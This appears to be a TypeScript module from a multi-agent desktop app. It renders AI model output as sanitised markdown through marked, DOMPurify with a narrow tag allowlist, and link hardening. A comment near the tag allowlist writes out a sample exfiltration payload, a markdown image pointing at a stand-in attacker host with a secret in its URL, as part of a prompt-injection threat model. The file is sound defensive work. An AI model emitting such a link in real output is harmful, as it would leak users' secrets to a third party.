// Safe markdown + syntax-highlighted rendering for seat output panes (main.ts's `setOutput`).
//
// Before this, every seat's output rendered via `output.textContent = text` - flat, unstyled,
// no code blocks, no lists - specifically because raw `textContent` is what makes model output
// unable to execute as HTML (docs/security-prompt-injection.md's threat model: this UI's whole
// premise is that the text flowing into it is written by models the operator does not fully
// control). Markdown rendering has to keep that guarantee, not trade it away for looking nicer -
// this module is `marked` (parse) -> DOMPurify (sanitize, strict allowlist) -> safe innerHTML,
// never a raw parse-and-inject. Every seat output pane goes through this, no exceptions.
import { marked } from "marked";
import DOMPurify from "dompurify";
// Core + a fixed language set, not the full `highlight.js` entrypoint - that default import
// bundles every supported language (~1MB minified) for a desktop app that only ever needs the
// languages a coding agent actually outputs. Add a language here (and its fenced-code alias, if
// different from its registered name) if a seat starts emitting one this list doesn't cover.
import hljs from "highlight.js/lib/core";
import javascript from "highlight.js/lib/languages/javascript";
import typescript from "highlight.js/lib/languages/typescript";
import python from "highlight.js/lib/languages/python";
import rust from "highlight.js/lib/languages/rust";
import bash from "highlight.js/lib/languages/bash";
import json from "highlight.js/lib/languages/json";
import yaml from "highlight.js/lib/languages/yaml";
import css from "highlight.js/lib/languages/css";
import xml from "highlight.js/lib/languages/xml"; // covers html
import markdown from "highlight.js/lib/languages/markdown";

hljs.registerLanguage("javascript", javascript);
hljs.registerLanguage("js", javascript);
hljs.registerLanguage("typescript", typescript);
hljs.registerLanguage("ts", typescript);
hljs.registerLanguage("python", python);
hljs.registerLanguage("py", python);
hljs.registerLanguage("rust", rust);
hljs.registerLanguage("rs", rust);
hljs.registerLanguage("bash", bash);
hljs.registerLanguage("sh", bash);
hljs.registerLanguage("shell", bash);
hljs.registerLanguage("json", json);
hljs.registerLanguage("yaml", yaml);
hljs.registerLanguage("yml", yaml);
hljs.registerLanguage("css", css);
hljs.registerLanguage("html", xml);
hljs.registerLanguage("xml", xml);
hljs.registerLanguage("markdown", markdown);
hljs.registerLanguage("md", markdown);

marked.setOptions({
  gfm: true,
  breaks: true,
});

// Deliberately narrow - this is prose/code from a model reply, not a general-purpose HTML
// surface. No `style`, no `iframe`, no `img` (an injected markdown image is a classic
// exfiltration vector: a model tricked into emitting `![](https://attacker/x?d=<secret>)` would
// otherwise fire a real network request the instant this renders, no click required - the
// existing seat-output text can legitimately contain path/token-shaped data). Links are kept
// (referencing a URL in prose is normal and useful) but hardened below, not just allowed as-is.
const ALLOWED_TAGS = [
  "p", "br", "hr",
  "strong", "em", "del", "code", "pre",
  "ul", "ol", "li",
  "blockquote",
  "h1", "h2", "h3", "h4", "h5", "h6",
  "table", "thead", "tbody", "tr", "th", "td",
  "a",
];
const ALLOWED_ATTR = ["href", "class"];

// http(s)/mailto only - blocks `javascript:`/`data:`/etc. schemes DOMPurify's own default regex
// would otherwise still allow through on an <a href>.
const SAFE_URI_REGEXP = /^(?:https?|mailto):/i;

DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    const href = node.getAttribute("href") || "";
    if (!SAFE_URI_REGEXP.test(href)) {
      node.removeAttribute("href");
    } else {
      // Untrusted-origin outbound links: never let one drive this app's own window context
      // (noopener) or leak a referrer (noreferrer), and never imply this app endorses the link
      // (nofollow) - the href itself is also the visible title, so a display text like "click
      // here" can't disguise where it actually points.
      node.setAttribute("target", "_blank");
      node.setAttribute("rel", "noopener noreferrer nofollow");
      node.setAttribute("title", href);
    }
  }
});

export function renderSeatOutput(container: HTMLElement, text: string): void {
  const rawHtml = marked.parse(text, { async: false }) as string;
  const cleanHtml = DOMPurify.sanitize(rawHtml, { ALLOWED_TAGS, ALLOWED_ATTR });
  container.innerHTML = cleanHtml;
  container.querySelectorAll<HTMLElement>("pre code").forEach((block) => {
    hljs.highlightElement(block);
  });
}
